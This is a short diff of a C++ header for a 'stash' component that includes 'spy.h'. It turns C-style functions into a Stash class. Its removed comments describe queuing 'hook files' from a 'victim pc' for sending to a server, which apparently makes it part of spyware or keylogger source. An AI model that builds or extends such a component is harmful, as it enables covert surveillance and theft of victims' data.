@@ -1,15 +1,17 @@
 #pragma once
 #include "spy.h"
+#include "storable.h"
+#include "queue.h"
 
-// initialize stash file which hold hook files.
-// hook files in stash will be send to server in queue.
-EXPORT BOOL init_stash(const char * filePath);
-// push a hook file which ready for send to server to stash file.
-VOID push_file(const char * filePath);
-// check empty state of stash file
-BOOL is_empty();
-// pop a hook file from stash file, hook file will be removed after
-// pop function has been called
-VOID pop_file(const char * buffer);
-// close stash file, this function will be called when victim pc is shutdowning
-VOID close_stash();
+class Stash: public Storable
+{
+	Queue * stg_queue;
+	void import_stash();
+	void export_stash();
+public:
+	void push(const char * file_path);
+	bool empty() const;
+	const char * pop(char * buffer);
+	Stash(const char * file_path);
+	virtual ~Stash();
+};
